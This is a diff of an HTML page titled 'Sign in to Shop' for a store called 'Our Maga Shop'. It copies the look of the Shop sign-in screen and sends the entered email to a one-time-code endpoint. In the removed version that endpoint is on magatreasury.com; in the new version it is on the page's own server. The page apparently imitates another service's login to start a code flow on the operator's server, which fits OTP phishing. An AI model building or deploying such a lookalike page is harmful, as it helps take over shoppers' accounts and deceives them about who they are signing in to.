@@ -1,258 +1,100 @@
 <!doctype html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Sign in to Shop</title>
-    <style>
-      :root {
-        --shop-purple: #5a31f4;
-        --bg-gray: #f4f4f4;
-        --text-dark: #000000;
-        --text-muted: #616161;
-        --border-color: #d1d1d1;
-      }
-      * {
-        box-sizing: border-box;
-      }
-      body {
-        margin: 0;
-        font-family:
-          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
-          Arial, sans-serif;
-        background-color: #ffffff;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        min-height: 100vh;
-        padding: 20px;
-        color: var(--text-dark);
-      }
-      .container {
-        width: 100%;
-        max-width: 400px;
-        text-align: center;
-      }
-      .icons {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 12px;
-        margin-bottom: 32px;
-        position: relative;
-      }
-      .icon-circle {
-        width: 48px;
-        height: 48px;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-weight: bold;
-        font-size: 14px;
-        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-      }
-      .icon-shop {
-        background-color: var(--shop-purple);
-        color: white;
-      }
-      .icon-om {
-        background-color: #f8f8f8;
-        color: black;
-        border: 1px solid #eeeeee;
-      }
-      .icons::after {
-        content: "";
-        position: absolute;
-        width: 20px;
-        height: 0;
-        border-top: 2px dotted #e0e0e0;
-        z-index: -1;
-      }
-      h1 {
-        font-size: 32px;
-        font-weight: 700;
-        margin: 0 0 8px 0;
-        letter-spacing: -0.02em;
-      }
-      .subtitle {
-        color: var(--text-muted);
-        font-size: 14px;
-        margin-bottom: 32px;
-      }
-      .subtitle b {
-        color: var(--text-dark);
-      }
-      form {
-        width: 100%;
-        display: flex;
-        flex-direction: column;
-        gap: 16px;
-      }
-      .input-field {
-        width: 100%;
-        height: 56px;
-        border-radius: 28px;
-        border: 1px solid var(--border-color);
-        padding: 0 24px;
-        font-size: 16px;
-        outline: none;
-        background-color: #f9f9f9;
-        transition: border-color 0.2s;
-      }
-      .input-field:focus {
-        border-color: var(--shop-purple);
-      }
-      .btn-continue {
-        width: 100%;
-        height: 56px;
-        border-radius: 28px;
-        border: none;
-        background-color: var(--shop-purple);
-        color: white;
-        font-size: 16px;
-        font-weight: 600;
-        cursor: pointer;
-        box-shadow: 0 4px 14px rgba(90, 49, 244, 0.3);
-        transition: background-color 0.2s;
-      }
-      .btn-continue:hover {
-        background-color: #4824d6;
-      }
-      .passkey-option {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-        margin-top: 24px;
-        font-size: 14px;
-        font-weight: 600;
-        cursor: pointer;
-        color: var(--text-dark);
-      }
-      .passkey-option svg {
-        width: 18px;
-        height: 18px;
-      }
-      .legal-text {
-        margin-top: 40px;
-        font-size: 11px;
-        line-height: 1.6;
-        color: #888888;
-        padding: 0 20px;
-      }
-      .legal-text a {
-        color: #888888;
-        text-decoration: underline;
-      }
-      .language-selector {
-        margin-top: auto;
-        padding-top: 60px;
-        font-size: 12px;
-        color: #888888;
-        display: flex;
-        align-items: center;
-        gap: 4px;
-        cursor: pointer;
-      }
-      .language-selector svg {
-        width: 12px;
-        height: 12px;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="container">
-      <div class="icons">
-        <div class="icon-circle icon-shop">shop</div>
-        <div class="icon-circle icon-om">OM</div>
-      </div>
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sign in to Shop</title>
+  <style>
+    :root {
+      --shop-purple: #5a31f4;
+      --bg-gray: #f4f4f4;
+      --text-dark: #000000;
+      --text-muted: #616161;
+      --border-color: #d1d1d1;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+      color: var(--text-dark);
+    }
+    .container { width: 100%; max-width: 400px; text-align: center; }
+    h1 { font-size: 32px; font-weight: 700; margin: 0 0 8px 0; }
+    .subtitle { color: var(--text-muted); font-size: 14px; margin-bottom: 32px; }
+    form { display: flex; flex-direction: column; gap: 16px; }
+    .input-field {
+      width: 100%; height: 56px; border-radius: 28px;
+      border: 1px solid var(--border-color); padding: 0 24px;
+      font-size: 16px; outline: none; background-color: #f9f9f9;
+    }
+    .input-field:focus { border-color: var(--shop-purple); }
+    .btn-continue {
+      width: 100%; height: 56px; border-radius: 28px;
+      background-color: var(--shop-purple); color: white;
+      font-size: 16px; font-weight: 600; cursor: pointer;
+      border: none;
+    }
+    .legal-text { margin-top: 40px; font-size: 11px; line-height: 1.6; color: #888888; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Sign in to Shop</h1>
+    <div class="subtitle">To continue to <b>Our Maga Shop</b></div>
 
-      <h1>Sign in to Shop</h1>
-      <div class="subtitle">To continue to <b>Our Maga Shop</b></div>
+    <form id="shop-login-form">
+      <input type="email" id="email-input" class="input-field" placeholder="Enter your email" required />
+      <button type="submit" class="btn-continue">Continue</button>
+    </form>
 
-      <form id="shop-login-form">
-        <input
-          type="email"
-          id="email-input"
-          class="input-field"
-          placeholder="Enter your email"
-          required
-        />
-        <button type="submit" class="btn-continue">Continue</button>
-      </form>
-
-      <div class="passkey-option">
-        <svg
-          viewBox="0 0 24 24"
-          fill="none"
-          stroke="currentColor"
-          stroke-width="2"
-          stroke-linecap="round"
-          stroke-linejoin="round"
-        >
-          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
-          <path d="M12 8v4"></path>
-          <path d="M12 16h.01"></path>
-        </svg>
-        Use a passkey
-      </div>
-
-      <div class="legal-text">
-        By continuing, you agree to Shop's <a href="#">terms</a>,
-        <a href="#">privacy policy</a>, and to sharing your email, name, and
-        avatar with Our Maga Shop. See their
-        <a href="/policies/terms.html">terms</a> and
-        <a href="/policies/privacy.html">privacy policy</a>.
-      </div>
+    <div class="legal-text">
+      By continuing, you agree to Shop's terms and privacy policy.
     </div>
+  </div>
 
-    <div class="language-selector">
-      English
-      <svg
-        viewBox="0 0 24 24"
-        fill="none"
-        stroke="currentColor"
-        stroke-width="2"
-        stroke-linecap="round"
-        stroke-linejoin="round"
-      >
-        <polyline points="6 9 12 15 18 9"></polyline>
-      </svg>
-    </div>
+  <script>
+    (function () {
+      const form = document.getElementById("shop-login-form");
+      const emailInput = document.getElementById("email-input");
 
-    <script>
-      (function () {
-        var form = document.getElementById("shop-login-form");
-        var emailInput = document.getElementById("email-input");
+      form.addEventListener("submit", async function (e) {
+        e.preventDefault();
+        const email = emailInput.value.trim();
 
-        form.addEventListener("submit", async function (e) {
-          e.preventDefault();
-          const email = emailInput.value.trim();
-          if (!email) return alert("Please enter your email");
+        if (!email) {
+          alert("Please enter your email");
+          return;
+        }
 
-          localStorage.setItem("loginEmail", email);
+        localStorage.setItem("loginEmail", email);
 
-          try {
-            const res = await fetch("https://magatreasury.com/api/start-otp", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ email }),
-            });
+        try {
+          const res = await fetch("/api/start-otp", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email })
+          });
 
-            const data = await res.json();
+          const data = await res.json();
 
-            if (data.success) {
-              window.location.href = "/finish.html";
-            } else {
-              alert(data.error || "Failed to send code");
-            }
-          } catch (err) {
-            alert("Network error. Please try again.");
+          if (data.success) {
+            window.location.href = "/finish.html";
+          } else {
+            alert(data.error || "Failed to send code");
           }
-        });
-      })();
-    </script>
-  </body>
+        } catch (err) {
+          console.error(err);
+          alert("Network error. Make sure server is running.");
+        }
+      });
+    })();
+  </script>
+</body>
 </html>
